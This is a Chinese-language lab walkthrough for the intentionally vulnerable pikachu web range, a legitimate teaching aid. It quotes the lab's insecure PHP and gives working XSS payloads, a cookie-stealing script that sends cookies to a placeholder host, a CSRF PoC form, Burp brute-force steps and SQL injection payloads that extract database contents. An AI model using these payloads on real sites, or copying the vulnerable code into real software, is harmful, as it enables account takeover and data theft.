# [pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)

## 前言

优秀的 web 基础靶场,与 dvwa 相比 dvwa 更适合教学，pikachu 漏洞种类更多，建议通关顺序 dvwa --> pikachu

---

## 实验环境
- phpstudy ：http://phpstudy.php.cn/
- Microsoft Windows 10 企业版 LTSC - 10.0.17763
- VMware® Workstation 15 Pro - 15.0.0 build-10134415
- kali 4.19.0-kali3-amd64

---

## Reference
- [第三周作业 token防爆破 （基于pikachu平台）burp token的暴力破解](https://blog.csdn.net/weixin_43899561/article/details/88780363)
- [第三周作业 1、从数字型注入认识SQL漏洞 2、字符型注入 3、搜索型及xx型输入](https://blog.csdn.net/weixin_43899561/article/details/88784162)
- [第四周作业1.虚拟机中安装Kail 2.union注入 3.information_schema注入 4.sql-Inject漏洞手动测试-基于函数报错的信息获取 5.Http Header注入](https://blog.csdn.net/weixin_43899561/article/details/88930597)
- [第六周作业 1.SQL inject防范措施 2.sqlmap工具使用案例 3.XSS基本概念和原理 4.反射型XSS(get) 5.存储型XSS 6.安装nmap](https://blog.csdn.net/weixin_43899561/article/details/89291896)
- [第七周作业 1.dom型XSS详解及演示 2.cookie获取及xss后台使用 3.反射型XSS(POST) 4.xss钓鱼演示 5.xss获取键盘记录演示](https://blog.csdn.net/weixin_43899561/article/details/89429726)
- [第八周作业 1.XSS盲打 2.XSS绕过 3.XSS绕过之htmlspecialchars()函数 4.XSS防范措施href和js输出](https://blog.csdn.net/weixin_43899561/article/details/89647834)
- [第八周作业 1.CSRF漏洞概述及原理 2.通过CSRF进行地址修改 3.token是如何防止CSRF漏洞？4.远程命令、代码执行漏洞原理及演示](https://blog.csdn.net/weixin_43899561/article/details/89742243)
- [insert、update和delete 注入方法](https://blog.csdn.net/qq1124794084/article/details/84590929)
- [SQL注入：宽字节注入（GBK双字节绕过）](https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/)






---

## 搭建/使用
**windows**
1. 把下载下来的 pikachu 文件夹放到 web 服务器根目录下;
2. 根据实际情况修改 inc/config.inc.php 里面的数据库连接配置;
3. 访问 http://x.x.x.x/pikachu ,会有一个红色的热情提示"欢迎使用,pikachu 还没有初始化，点击进行初始化安装!",点击即可完成安装

---

## Burte Force
“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。

理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：
1. 是否要求用户设置复杂的密码；
2. 是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；
3. 是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；
4. 是否采用了双因素认证；

...等等。千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的!

### 基于表单的暴力破解
**服务器端核心代码**
```php
//典型的问题,没有验证码,没有其他控制措施,可以暴力破解
if(isset($_POST['submit']) && $_POST['username'] && $_POST['password']){

    $username = $_POST['username'];
    $password = $_POST['password'];
    $sql = "select * from users where username=? and password=md5(?)";
    $line_pre = $link->prepare($sql);

    $line_pre->bind_param('ss',$username,$password);

    if($line_pre->execute()){
        $line_pre->store_result();
        if($line_pre->num_rows>0){
            $html.= '<p> login success</p>';

        } else{
            $html.= '<p> username or password is not exists～</p>';
        }

    } else{
        $html.= '<p>执行错误:'.$line_pre->errno.'错误信息:'.$line_pre->error.'</p>';
    }

}
```

**漏洞利用**

利用 burpsuite 爆破，略

### 验证码绕过(on server)
**服务器端核心代码**
```php
$html="";
if(isset($_POST['submit'])) {
    if (empty($_POST['username'])) {
        $html .= "<p class='notice'>用户名不能为空</p>";
    } else {
        if (empty($_POST['password'])) {
            $html .= "<p class='notice'>密码不能为空</p>";
        } else {
            if (empty($_POST['vcode'])) {
                $html .= "<p class='notice'>验证码不能为空哦！</p>";
            } else {
//              验证验证码是否正确
                if (strtolower($_POST['vcode']) != strtolower($_SESSION['vcode'])) {
                    $html .= "<p class='notice'>验证码输入错误哦！</p>";
                    //应该在验证完成后,销毁该$_SESSION['vcode']
                }else{

                    $username = $_POST['username'];
                    $password = $_POST['password'];
                    $vcode = $_POST['vcode'];

                    $sql = "select * from users where username=? and password=md5(?)";
                    $line_pre = $link->prepare($sql);

                    $line_pre->bind_param('ss',$username,$password);

                    if($line_pre->execute()){
                        $line_pre->store_result();
                        //虽然前面做了为空判断,但最后,却没有验证验证码!!!
                        if($line_pre->num_rows()==1){
                            $html.='<p> login success</p>';
                        }else{
                            $html.= '<p> username or password is not exists～</p>';
                        }
                    }
                    else{
                        $html.= '<p>执行错误:'.$line_pre->errno.'错误信息:'.$line_pre->error.'</p>';
                    }
                }
            }
        }
    }
}
```
服务器端只检查了一次验证码，而后未将验证码过期处理，一直有效，可验证一次重复爆破

**漏洞利用**

burpsuite，抓个验证码输入正确的请求，就可以重复爆破了

![image](../../../img/渗透/实验/pikachu/1.png)

### 验证码绕过(on client)
**服务器端核心代码**
```php
if(isset($_POST['submit'])){
    if($_POST['username'] && $_POST['password']) {
        $username = $_POST['username'];
        $password = $_POST['password'];
        $sql = "select * from users where username=? and password=md5(?)";
        $line_pre = $link->prepare($sql);


        $line_pre->bind_param('ss', $username, $password);

        if ($line_pre->execute()) {
            $line_pre->store_result();
            if ($line_pre->num_rows > 0) {
                $html .= '<p> login success</p>';

            } else {
                $html .= '<p> username or password is not exists～</p>';
            }

        } else {
            $html .= '<p>执行错误:' . $line_pre->errno . '错误信息:' . $line_pre->error . '</p>';
        }

    }else{
        $html .= '<p> please input username and password～</p>';
    }
}
```

**客户端端核心代码**
```html
<script language="javascript" type="text/javascript">
    var code; //在全局 定义验证码
    function createCode() {
        code = "";
        var codeLength = 5;//验证码的长度
        var checkCode = document.getElementById("checkCode");
        var selectChar = new Array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9,'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z');//所有候选组成验证码的字符，当然也可以用中文的

        for (var i = 0; i < codeLength; i++) {
            var charIndex = Math.floor(Math.random() * 36);
            code += selectChar[charIndex];
        }
        //alert(code);
        if (checkCode) {
            checkCode.className = "code";
            checkCode.value = code;
        }
    }

    function validate() {
        var inputCode = document.querySelector('#bf_client .vcode').value;
        if (inputCode.length <= 0) {
            alert("请输入验证码！");
            return false;
        } else if (inputCode != code) {
            alert("验证码输入错误！");
            createCode();//刷新验证码
            return false;
        }
        else {
            return true;
        }
    }


    createCode();
</script>
```
客户端做验证码验证，服务器端无验证

**漏洞利用**

burp 抓个正确的包,把验证码部分直接去掉就可以继续爆破了

### token防爆破?
**服务器端核心代码**
```php
if(isset($_POST['submit']) && $_POST['username'] && $_POST['password'] && $_POST['token']==$_SESSION['token']){

    $username = $_POST['username'];
    $password = $_POST['password'];
    $sql = "select * from users where username=? and password=md5(?)";
    $line_pre = $link->prepare($sql);


    $line_pre->bind_param('ss',$username,$password);

    if($line_pre->execute()){
        $line_pre->store_result();
        if($line_pre->num_rows>0){
            $html.= '<p> login success</p>';

        } else{
            $html.= '<p> username or password is not exists～</p>';
        }

    } else{
        $html.= '<p>执行错误:'.$line_pre->errno.'错误信息:'.$line_pre->error.'</p>';
    }

}

//生成token
set_token();
```

**什么是token**

简单的说 token 是由服务端生成的一串字符串，作为客户端向服务端请求的一个标识。在前端使用用户名/密码向服务端发送请求认证，服务端认证成功，那么在服务端会返回 token 给前端，前端在每次请求时会带上服务端发来的 token 来证明自己的合法性。

**漏洞利用**

burp 抓个正确的包,将以下两个设置为变量

![image](../../../img/渗透/实验/pikachu/2.png)

在 Option 中的 Grep Extract 中点击 Add，在点击 Refetch response，找到返回的包，找到来自服务器返回的 token，为了便于查找可以在最下方的输入栏输入 token 直接找到 token 的值

![image](../../../img/渗透/实验/pikachu/3.png)

选中 token 的值，复制，同时在选中状态下点击确定，同时在 Option 中的最下方勾选 always，并将线程设置为 1 ,如果不将线程设为1会出现报错

接下来设置 Payloads，对密码的 Payloads 直接导入字典。

![image](../../../img/渗透/实验/pikachu/4.png)

对 token 的 Payloads 的参数设置为 Recursive grep，同时在 Payload Options 选中第一项，并将之前复制的 token 值输入到下面的输入栏中。开始爆破。

![image](../../../img/渗透/实验/pikachu/5.png)

后面略

---

## XSS
Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写"CSS"冲突，故又称 XSS。一般XSS可以分为如下几种常见类型：
1. 反射性XSS;
2. 存储型XSS;
3. DOM型XSS;

XSS 漏洞一直被评估为 web 漏洞中危害较大的漏洞，在 OWASP TOP10 的排名中一直属于前三的江湖地位。
XSS 是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。
形成 XSS 漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。
因此在 XSS 漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:
1. 输入过滤：对输入进行过滤，不允许可能导致 XSS 攻击的字符输入;
2. 输出转义：根据输出点的位置对输出到前端的内容进行适当转义;

**跨站脚本漏洞简单的测试流程**
1. 在目标站点上找到输入点,比如查询接口,留言板等;
2. 输入一组"特殊字符+唯一识别字符",点击提交后,查看返回的源码,是否有做对应的处理;
3. 通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在XSS漏洞;

### 反射型xss(get)
![image](../../../img/渗透/实验/pikachu/6.png)

**服务器端核心代码**
```php
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="<p class='notice'>输入'kobe'试试-_-</p>";
    }else{
        if($_GET['message']=='kobe'){
            $html.="<p class='notice'>愿你和{$_GET['message']}一样，永远年轻，永远热血沸腾！</p><img src='{$PIKA_ROOT_DIR}assets/images/nbaplayer/kobe.png' />";
        }else{
            $html.="<p class='notice'>who is {$_GET['message']},i don't care!</p>";
        }
    }
}
```

**漏洞利用**

按流程来，为了找到输入点，先提交一组特殊字符+唯一识别字符，再去查看源代码

![image](../../../img/渗透/实验/pikachu/7.png)

下图说明输入的字符被直接输入到了这个 P 标签中，这里就存在一个输出点

F12 修改前端数量限制，输入 payload `<script>alert('沵咑礷赇潒礤蒣騉')</script>` 点击提交

![image](../../../img/渗透/实验/pikachu/8.png)

刷新一次后就不会进行弹窗，说这仅仅是一次性。

### 反射性xss(post)
POST 请求区别与 GET 请求，POST 请求不能从 URL 让用户向服务器提交数据。所以为了进行注入，需要让用户代替攻击者提交 POST 请求，这就需要攻击者自己搭建站点，然后再站点内写一个 POST 表单，将我们搭建出的连接发给用户，这样就能让用户帮攻击者提交 POST 请求发给存在 XSS 漏洞的中。这样就能窃取到用户的 cookie，就能伪造用户登陆达到破坏的目的。

**服务器端核心代码**
```php
if(isset($_POST['submit'])){
    if(empty($_POST['message'])){
        $html.="<p class='notice'>输入'kobe'试试-_-</p>";
    }else{

        //下面直接将前端输入的参数原封不动的输出了,出现xss
        if($_POST['message']=='kobe'){
            $html.="<p class='notice'>愿你和{$_POST['message']}一样，永远年轻，永远热血沸腾！</p><img src='{$PIKA_ROOT_DIR}assets/images/nbaplayer/kobe.png' />";
        }else{
            $html.="<p class='notice'>who is {$_POST['message']},i don't care!</p>";
        }
    }
}
```

**漏洞利用**

和上面 get 型一样，但这里不需要 F12 修改输入限制，输入 payload `<script>alert('沵咑礷赇潒礤蒣騉')</script>` 点击提交

### 存储型xss
**服务器端核心代码**
```php
if(array_key_exists("message",$_POST) && $_POST['message']!=null){
    $message=escape($link, $_POST['message']);
    $query="insert into message(content,time) values('$message',now())";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)!=1){
        $html.="<p>数据库出现异常，提交失败！</p>";
    }
}

if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){

    //彩蛋:虽然这是个存储型xss的页面,但这里有个delete的sql注入
    $query="delete from message where id={$_GET['id']}";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)==1){
        echo "<script type='text/javascript'>document.location.href='xss_stored.php'</script>";
    }else{
        $html.="<p id='op_notice'>删除失败,请重试并检查数据库是否还好!</p>";

    }

}
```

**漏洞利用**

同之前的思路，先输入一组特殊字符+唯一识别字符，查看源代码，能发现输出点和反射性 XSS 是相同的。

![image](../../../img/渗透/实验/pikachu/9.png)

输入 payload `<script>alert('老铁，欧里给!')</script>` 点击提交

再刷新一次，还是会返回设置的 payload 中输入的内容，说明会将插入的内容会被存到数据库中，会造成持续性的攻击。再源代码里也能看到被插入进的 payload。

### DOM型xss
**什么是 DOM**

DOM 全称是 Document Object Model，也就是文档对象模型。我们可以将 DOM 理解为，一个与系统平台和编程语言无关的接口，程序和脚本可以通过这个接口动态地访问和修改文档内容、结构和样式。当创建好一个页面并加载到浏览器时，DOM 就悄然而生，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。故可以使用 Javascript 语言来操作 DOM 以达到网页的目的。

**什么是 DOM 型 XSS**

首先 DOM 型 XSS 其实是一种特殊类型的反射型 XSS，它是基于 DOM 文档对象模型的一种漏洞。
在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的 Document
object 文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过 DOM 来动态修改页面内容，从客户端获取 DOM 中的数据并在本地执行。基于这个特性，就可以利用 JS 脚本来实现 XSS 漏洞的利用

**核心代码**
```html
<div id="xssd_main">
                <script>
                    function domxss(){
                        var str = document.getElementById("text").value;
                        document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
                    }
                    //试试：'><img src="#" onmouseover="alert('xss')">
                    //试试：' onclick="alert('xss')">,闭合掉就行
                </script>
                <!--<a href="" onclick=('xss')>-->
                <input id="text" name="text" type="text"  value="" />
                <input id="button" type="button" value="click me!" onclick="domxss()" />
                <div id="dom"></div>
            </div>
```

**漏洞利用**

输入`test#!12` 测试，F12 查看源代码，找出可注入点是 `<a href="test#!12">what do you see?</a>` ，对 href 构造一个闭合，这样就能实现对 a 标签的一个“控制”的作用。

payload 构造如下 `'> <marquee loop="99" onfinish=alert(1)>hack the planet</marquee>`

![image](../../../img/渗透/实验/pikachu/10.png)

### DOM型xss-x
**核心代码**
```html
<div id="xssd_main">
                <script>
                    function domxss(){
                        var str = window.location.search;
                        var txss = decodeURIComponent(str.split("text=")[1]);
                        var xss = txss.replace(/\+/g,' ');
//                        alert(xss);

                        document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";
                    }
                    //试试：'><img src="#" onmouseover="alert('xss')">
                    //试试：' onclick="alert('xss')">,闭合掉就行
                </script>
                <!--<a href="" onclick=('xss')>-->
                <form method="get">
                <input id="text" name="text" type="text"  value="" />
                <input id="submit" type="submit" value="请说出你的伤心往事"/>
                </form>
                <div id="dom"></div>
            </div>
```

**漏洞利用**

同之前的步骤，查看源代码，区别第一个 DOM 演示，输入是从 URL 的参数中获取的（类似于反射型），但输出任在 a 标签里，故和之前的方法相同设置 payload

payload 构造如下 `'> <marquee loop="99" onfinish=alert(1)>hack the planet</marquee>`

### xss之盲打
**服务器端核心代码**
```php
if(array_key_exists("content",$_POST) && $_POST['content']!=null){
    $content=escape($link, $_POST['content']);
    $name=escape($link, $_POST['name']);
    $time=$time=date('Y-m-d g:i:s');
    $query="insert into xssblind(time,content,name) values('$time','$content','$name')";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)==1){
        $html.="<p>谢谢参与，阁下的看法我们已经收到!</p>";
    }else {
        $html.="<p>ooo.提交出现异常，请重新提交</p>";
    }
}
```

XSS盲打就是攻击者在不知道后台是否存在 xss 漏洞的情况下，提交恶意 JS 代码在类似留言板等输入框后，所展现的后台位置的情况下，网站采用了攻击者插入的恶意代码，当后台管理员在操作时就会触发插入的恶意代码，从而达到攻击者的目的。

**漏洞利用**

输入 payload `<script>alert('老铁，欧里给!')</script>` ，观察到可注入点,以管理员的身份登入后台，就会出现弹窗，这就是一个简单的盲打。通过 xss 钓鱼的方法就能获取到 cookie，就能伪造管理员身份进行登陆了。

![image](../../../img/渗透/实验/pikachu/11.png)

- 后台: http://<IP地址!!!>/pikachu/vul/xss/xssblind/admin_login.php
- 账号密码: admin 123456

到 pikachu 平台下管理工具，进去初始化平台

盗 cookie payload `<script>document.location = 'http://<xss平台地址>/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>`

![image](../../../img/渗透/实验/pikachu/12.png)

### xss之过滤
**服务器端核心代码**
```php
if(isset($_GET['submit']) && $_GET['message'] != null){
    //这里会使用正则对<script进行替换为空,也就是过滤掉
    $message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);
    if($message == 'yes'){
        $html.="<p>那就去人民广场一个人坐一会儿吧!</p>";
    }else{
        $html.="<p>别说这些'{$message}'的话,不要怕,就是干!</p>";
    }

}
```

这里注释写的很清楚了，不多说了

**漏洞利用**

过滤了 `<script` ，还有很多的标签可以用,再说还有很多绕过方法

- payload: `<marquee loop="99" onfinish=alert(1)>hack the planet</marquee>`

- payload: `<ScrIpT>alert('老铁，欧里给!')</sCriPt>`

### xss之htmlspecialchars
**服务器端核心代码**
```php
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="<p class='notice'>输入点啥吧！</p>";
    }else {
        //使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对'处理
        $message=htmlspecialchars($_GET['message']);
        $html1.="<p class='notice'>你的输入已经被记录:</p>";
        //输入的内容被处理后输出到了input标签的value属性里面,试试:' onclick='alert(111)'
//        $html2.="<input class='input' type='text' name='inputvalue' readonly='readonly' value='{$message}' style='margin-left:120px;display:block;background-color:#c0c0c0;border-style:none;'/>";
        $html2.="<a href='{$message}'>{$message}</a>";
    }
}
```

- **htmlspecialchars(string,flags,character-set,double_encode)**

    htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。

    htmlspecialchars() 函数把预定义的字符转换为 HTML 实体，从而使XSS攻击失效。但是这个函数默认配置不会将单引号和双引号过滤，只有设置了quotestyle规定如何编码单引号和双引号才能会过滤掉单引号

**漏洞利用**

先输入被预定义的字符 `&<s>"11<>11'123<123>`，在前端查看代码观察有是否有过滤掉单引号或双引号

![image](../../../img/渗透/实验/pikachu/13.png)

可见单引号后面的出来了

构造个 payload `'onclick='alert(1)'`

![image](../../../img/渗透/实验/pikachu/14.png)

### xss之href输出
**服务器端核心代码**
```php
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="<p class='notice'>叫你输入个url,你咋不听?</p>";
    }
    if($_GET['message'] == 'www.baidu.com'){
        $html.="<p class='notice'>我靠,我真想不到你是这样的一个人</p>";
    }else {
        //输出在a标签的href属性里面,可以使用javascript协议来执行js
        //防御:只允许http,https,其次在进行htmlspecialchars处理
        $message=htmlspecialchars($_GET['message'],ENT_QUOTES);
        $html.="<a href='{$message}'> 阁下自己输入的url还请自己点一下吧</a>";
    }
}
```

**漏洞利用**

先输入一些字符串 `&<s>"11<>11'123<123>`，查看前端的源代码，发现输入的字符都被转义了。但 `<a>` 标签的 href 属性也是可以执行 JS 表达式的

![image](../../../img/渗透/实验/pikachu/15.png)

构造个 payload `Javascript:alert('1')`

![image](../../../img/渗透/实验/pikachu/16.png)

### xss之js输出
**服务器端核心代码**
```php
if(isset($_GET['submit']) && $_GET['message'] !=null){
    $jsvar=$_GET['message'];
//    $jsvar=htmlspecialchars($_GET['message'],ENT_QUOTES);
    if($jsvar == 'tmac'){
        $html.="<img src='{$PIKA_ROOT_DIR}assets/images/nbaplayer/tmac.jpeg' />";
    }
}
```
```js
<script>
    $ms='<?php echo $jsvar;?>';
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmac确实厉害,看那小眼神..')
        }else {
//            alert($ms);
            $('#fromjs').text('无论如何不要放弃心中所爱..')
        }

    }
</script>
```

**漏洞利用**

先输入一些字符串 `&<s>"11<>11'123<123>`，查看前端的源代码

![image](../../../img/渗透/实验/pikachu/17.png)

对于 JS 代码，我们需要构造一个闭合，根据显示的代码构造 payload `abc'</script><script>alert(1)</script>`

![image](../../../img/渗透/实验/pikachu/18.png)

---

## CSRF
**如何确认存在一个CSRF漏洞**
1. 对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造

    比如修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造；

    比如对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造；

2. 确认凭证的有效期（这个问题会提高CSRF被利用的概率）

    虽然退出或者关闭了浏览器，但存在本地的cookie仍然有效，或者session并没有及时过期，导致CSRF攻击变的简单

### CSRF(get)
首先进行登陆，修改一下个人信息，并到 Brup Suite 上进行抓包，将抓到的 URL 进行修改(由自己作为攻击者)，再发送给攻击目标(由自己作为被攻击者)

![image](../../../img/渗透/实验/pikachu/19.png)

**漏洞利用**

稍微修改一下，测试

`http://<服务器IP!!!>/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=futa&phonenum=110&add=123&email=lili%40pikachu.com1&submit=submit`

![image](../../../img/渗透/实验/pikachu/20.png)

### CSRF(POST)
同样，登陆，修改一下个人信息，并到Brup Suite上进行抓包，对于POST型，请求已经不能通过修改URL来借用用户权限，那么需要自己做一个表单，再返回到提交页面来完成修改。

**漏洞利用**

直接从 burp 生成 poc 表单

![image](../../../img/渗透/实验/pikachu/21.png)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://<IP address>/pikachu/vul/csrf/csrfpost/csrf_post_edit.php" method="POST">
      <input type="hidden" name="sex" value="futa1" />
      <input type="hidden" name="phonenum" value="1110" />
      <input type="hidden" name="add" value="1213" />
      <input type="hidden" name="email" value="lil1i&#64;pikachu&#46;com1" />
      <input type="hidden" name="submit" value="submit" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

![image](../../../img/渗透/实验/pikachu/22.png)

### CSRF Token
要抵御 CSRF，关键在于在请求中放入攻击者不能伪造的信息，且该信息不存在于 cookie 之中。故每次请求都可以加入一个随机码，且后台要对这个随机码进行验证。

![image](../../../img/渗透/实验/pikachu/23.png)

**漏洞利用**

如果做过 dvwa 同级的 csrf 应该清楚，这里可以使用 xss 来配合盗取 token 来造成 csrf,这里略

---

## Sql Inject
在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。
`一个严重的SQL注入漏洞，可能会直接导致一家公司破产！`

SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。

在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：
1. 对传进SQL语句里面的变量进行过滤，不允许危险字符传入；
2. 使用参数化（Parameterized Query 或 Parameterized Statement）；
3. 还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重!

### 数字型注入(post)
**服务器端核心代码**
```php
if(isset($_POST['submit']) && $_POST['id']!=null){
    //这里没有做任何处理，直接拼到select里面去了,形成Sql注入
    $id=$_POST['id'];
    $query="select username,email from member where id=$id";
    $result=execute($link, $query);
    //这里如果用==1,会严格一点
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $username=$data['username'];
            $email=$data['email'];
            $html.="<p class='notice'>hello,{$username} <br />your email is: {$email}</p>";
        }
    }else{
        $html.="<p class='notice'>您输入的user id不存在，请重新输入！</p>";
    }
}
```

**漏洞利用**

抓包,查看 post 参数

![image](../../../img/渗透/实验/pikachu/26.png)

构造 payload

`1' or '1' ='1` 报错

`1 or 1 =1` 未报错,存在数字型注入

![image](../../../img/渗透/实验/pikachu/27.png)

### 字符型注入(get)
**服务器端核心代码**
```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    //这里没有做任何处理，直接拼到select里面去了
    $name=$_GET['name'];
    //这里的变量是字符型，需要考虑闭合
    $query="select id,email from member where username='$name'";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{

        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}
```

**漏洞利用**

构造 payload

`http://<IP address!!!>/pikachu/vul/sqli/sqli_str.php?name=1' or '1' ='1&submit=%E6%9F%A5%E8%AF%A2`

![image](../../../img/渗透/实验/pikachu/28.png)

### 搜索型注入
**服务器端核心代码**
```php
if(isset($_GET['submit']) && $_GET['name']!=null){

    //这里没有做任何处理，直接拼到select里面去了
    $name=$_GET['name'];

    //这里的变量是模糊匹配，需要考虑闭合
    $query="select username,id,email from member where username like '%$name%'";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        //彩蛋:这里还有个xss
        $html2.="<p class='notice'>用户名中含有{$_GET['name']}的结果如下：<br />";
        while($data=mysqli_fetch_assoc($result)){
            $uname=$data['username'];
            $id=$data['id'];
            $email=$data['email'];
            $html1.="<p class='notice'>username：{$uname}<br />uid:{$id} <br />email is: {$email}</p>";
        }
    }else{

        $html1.="<p class='notice'>0o。..没有搜索到你输入的信息！</p>";
    }
}
```

**漏洞利用**

随意输入一个字母，能看到匹配出了对应的信息。那么按照 SQL 的模糊查询命令 `select * from 表名 where 字段名 like ‘%（对应值）%’;` ，发现可以按照之前的思路来实现万能语句的拼接。

构造 payload `' or 1=1 #`

这里还存在一个xss `'# <script>alert('沵咑礷赇潒礤蒣騉')</script>`

**union注入**

union 操作符用于合并两个或多个 SQL 语句集合起来，得到联合的查询结果。

以 pikachu 平台的数据库为例，输入 `select id,email from member where username='kevin' union select username,pw from member where id=1` ;查看查询结果。

![image](../../../img/渗透/实验/pikachu/29.png)

但是联合多个 SQL 语句时可能出现报错，因为查询的字段不能超过主查询的字段，这个时候可以在 SQL 语句后面加 order by 进行排序，通过这个办法可以判断主查询的字段。返回 pikachu 平台，在 SQL 注入下随意打开搜索型栏目，输入我们构造的 order by 语句进行测试。

输入 `' order by 4#%` ,报错

输入 `' order by 3#%` ,未报错，通过这个简单的办法找到主查询一共有三个字段。

构造 payload: `a' union select database(),user(),version()#%`

![image](../../../img/渗透/实验/pikachu/30.png)

**information_schema注入**

information_schema 数据库是 MySQL 系统自带的数据库。其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。通过 information_schema 注入，我们可以将整个数据库内容全部窃取出来。接下来是对 information_schema 注入的演示。
首先同之前的步骤，使用 order by 来判断查询的字段。先找出数据库的名称，输入 `a' union select database(),user(),4#%` 得到反馈，判断数据库名称为 pikachu。

![image](../../../img/渗透/实验/pikachu/31.png)

获取表名，输入：`a' union select table_schema,table_name,2 from information_schema.tables where table_schema='pikachu'#`

![image](../../../img/渗透/实验/pikachu/32.png)

获取字段名，输入：`a'union select table_name,column_name,2 from information_schema.columns where table_name='users'#%`

![image](../../../img/渗透/实验/pikachu/33.png)

获取数据，输入：`a'union select username ,password,4 from users#%`

![image](../../../img/渗透/实验/pikachu/34.png)

**select下的报错演示**

select/insert/update/delete 都可以使用报错来获取信息.

- **UPDATEXML(xml_document,XPathstring,new_value)**

    Updatexml() 函数作用:改变(查找并替换)XML文档中符合条件的节点的值.
    - 第一个参数:fiedname是String格式,为表中的字段名.
    - 第二个参数:XPathstring(Xpath格式的字符串).
    - 第三个参数:new_value,String格式,替换查找到的符合条件的 X

改变 XML_document 中符合 XPATH_string 的值

而我们的注入语句为： `a' and updatexml(1,concat(0x7e,(SELECT @@version)),0)#`

其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出 `ERROR 1105 (HY000): XPATH syntax error: ':root@localhost'`

获取数据库表名，输入：`a' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu')),0)#` ，但是反馈回的错误表示只能显示一行，所以采用 limit 来一行一行显示

![image](../../../img/渗透/实验/pikachu/35.png)

输入 `a' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu'limit 0,1)),0)#` 更改limit后面的数字pikachu'limit 0，爆表名

![image](../../../img/渗透/实验/pikachu/36.png)

![image](../../../img/渗透/实验/pikachu/37.png)

![image](../../../img/渗透/实验/pikachu/38.png)

字段名 `a' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 0,1)),0)#` 更改limit后面的数字，爆表名

![image](../../../img/渗透/实验/pikachu/39.png)

![image](../../../img/渗透/实验/pikachu/40.png)

![image](../../../img/渗透/实验/pikachu/41.png)

![image](../../../img/渗透/实验/pikachu/42.png)

数据 `a' and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#`

![image](../../../img/渗透/实验/pikachu/43.png)

